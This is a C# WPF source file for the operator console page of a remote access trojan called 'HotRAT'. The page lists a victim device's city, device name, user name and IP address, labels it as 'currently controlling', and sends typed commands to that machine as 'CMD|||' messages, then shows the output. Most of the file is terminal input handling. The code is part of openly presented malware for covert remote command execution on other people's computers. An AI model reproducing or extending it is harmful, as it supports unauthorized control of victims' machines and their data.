using Data;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Timers;
using Wpf.Ui.Controls;
using System.Diagnostics;
using static System.Net.Mime.MediaTypeNames;

namespace HotRAT.Server.Pages
{
    /// <summary>
    /// DOS.xaml 的交互逻辑
    /// </summary>
    public partial class DOS : Page
    {
        public int enterTimes = 0;
        System.Timers.Timer timer = new System.Timers.Timer();
        public double positionX = 0;

        private int i = 0;
        private int j = 0;
        private int m = 0;
        private int n = 0;

        private List<string> CmdList = new List<string>();
        private string Cmd;

        private static DOS _instance;
        public DOS()
        {
            InitializeComponent();
            _instance = this;
            this.Loaded += (_, _) =>
            {
                Brush brush;
                if (SoftWareSettings.IsLight)
                    brush = SoftWareSettings.LightFontColor;
                else
                    brush = SoftWareSettings.DarkFontColor;

                MainCmd.Foreground = brush;
                CmdList.Clear();
                MainCmd.Text = "";
                if (MainData.SelectDevice == null)
                {
                    Wpf.Ui.Controls.MessageBox msg = new Wpf.Ui.Controls.MessageBox();
                    msg.Content = "No valid instance has been selected.";
                    msg.Title = "Error!!!                 ";
                    msg.Height = 200;
                    msg.Width = 500;
                    msg.ShowDialogAsync().Wait();
                    MainWindow.tabControl.SelectedIndex = 0;
                }
                else
                {
                    if (MainCmd.Text == "")
                    {
                        this.MainCmd.Text = $"当前正在控制[{MainData.SelectDevice.City}][{MainData.SelectDevice.DeviceName}][{MainData.SelectDevice.UserName}][{MainData.SelectDevice.IP}]";
                        this.MainCmd.Text += "\nHotRAT>";
                    }
                    else
                    {
                        if (this.MainCmd.Text.EndsWith(">"))
                        {
                            return;
                        }
                        else if (this.MainCmd.Text.EndsWith("\n"))
                        {
                            this.MainCmd.Text += "\n\rHotRAT>";
                        }

                    }
                }

            };
        }

        private void MainCmd_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            MainCmd.SelectionStart = MainCmd.Text.Length;
        }

        private void MainCmd_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            //Enter
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Enter))
            {
                e.Handled = true;
                var a = MainCmd.Text;
                Cmd = a.Substring(a.LastIndexOf(">") + 1, MainCmd.Text.Length - a.LastIndexOf(">") - 1);
                if (a.EndsWith(">" + Cmd))
                {
                    //MessageBox.Show("OK");
                    RemoteCommand(Cmd);
                }

                if (a.EndsWith(">clc"))
                {
                    this.MainCmd.Text = "HotRAT>";
                    CmdList.Clear();
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                }
            }

            //Backspace
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Back))
            {
                e.Handled = true;
                var a = MainCmd.Text;
                if (a.EndsWith(">"))
                {
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    var NewChar = new char[charArray.Length - 1];
                    if (charArray.Length > 0)
                    {
                        Array.Copy(charArray, NewChar, charArray.Length - 1);
                        string s = new string(NewChar);
                        MainCmd.Text = a.Remove(a.LastIndexOf(">")) + ">" + s;
                        MainCmd.SelectionStart = MainCmd.Text.Length;
                    }
                    else
                    {
                        return;
                    }
                }
            }

            //Left
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Left))
            {
                i++;
                e.Handled = true;
                var a = MainCmd.Text;
                if (a.EndsWith(">"))
                {
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    if (i <= charArray.Length)
                    {
                        MainCmd.SelectionStart = MainCmd.Text.Length - i;
                        j = charArray.Length - i;
                        return;
                    }
                }
            }

            //Right
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Right))
            {
                j++;
                e.Handled = true;
                var a = MainCmd.Text;
                if (a.EndsWith(">"))
                {
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                    return;
                }
                else
                {
                    var str = a.Split('>');
                    var charArray = str[str.Length - 1].ToCharArray();
                    if (j <= charArray.Length)
                    {
                        MainCmd.SelectionStart = MainCmd.Text.Length - charArray.Length + j;
                        i = charArray.Length - j;
                        return;
                    }
                }
            }

            //Up
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Up))
            {
                m++;
                e.Handled = true;
                var a = MainCmd.Text;
                if (a.EndsWith(">"))
                {
                    if (CmdList.Count > 0 && (m - 1 < CmdList.Count))
                    {
                        MainCmd.Text += CmdList[CmdList.Count - m];
                        n = CmdList.Count - m;
                    }
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                }
                else
                {
                    MainCmd.Text = a.Remove(a.LastIndexOf(">")) + ">";
                    if (CmdList.Count > 0 && (m - 1 < CmdList.Count))
                    {
                        MainCmd.Text += CmdList[CmdList.Count - m];
                        n = CmdList.Count - m;
                    }
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                }

            }

            //Dowm
            if (e.KeyStates == Keyboard.GetKeyStates(Key.Down))
            {
                n++;
                e.Handled = true;
                var a = MainCmd.Text;
                if (a.EndsWith(">"))
                {
                    if (CmdList.Count > 0 && (n - 1 < CmdList.Count))
                    {
                        MainCmd.Text += CmdList[n - 1];
                        m = CmdList.Count - n;
                    }
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                }
                else
                {
                    MainCmd.Text = a.Remove(a.LastIndexOf(">")) + ">";
                    if (CmdList.Count > 0 && (n - 1 < CmdList.Count))
                    {
                        MainCmd.Text += CmdList[n - 1];
                        m = CmdList.Count - n;
                    }
                    MainCmd.SelectionStart = MainCmd.Text.Length;
                }
            }

        }

        public async void RemoteCommand(string cmd)
        {
            if(cmd != "info")
            {
                Debug.WriteLine($"Send {cmd}");
                await MainWindow.server.SendDataToClientAsync(MainData.SelectDevice.IP, "CMD|||" + cmd+ "");
            }
            else
            {
                add("什么玩意因否没深");
            }
        }

        public void add(string result)
        {
            this.MainCmd.Text += "\n" + result + "\n\r>";
            CmdList.Add(Cmd);
            MainCmd.SelectionStart = MainCmd.Text.Length;
        }

        public static void addResult(string result)
        {
            _instance.Dispatcher.Invoke(() =>
            {
                _instance.MainCmd.Text += "\n" + result + "\n\r>";
                _instance.CmdList.Add(_instance.Cmd);
                _instance.MainCmd.SelectionStart = _instance.MainCmd.Text.Length;
            });

        }

        private void MainCmd_MouseMove(object sender, MouseEventArgs e)
        {
            MainCmd.Select(MainCmd.Text.Length, 0);
            MainCmd.SelectionStart = MainCmd.Text.Length;
        }
    }
}
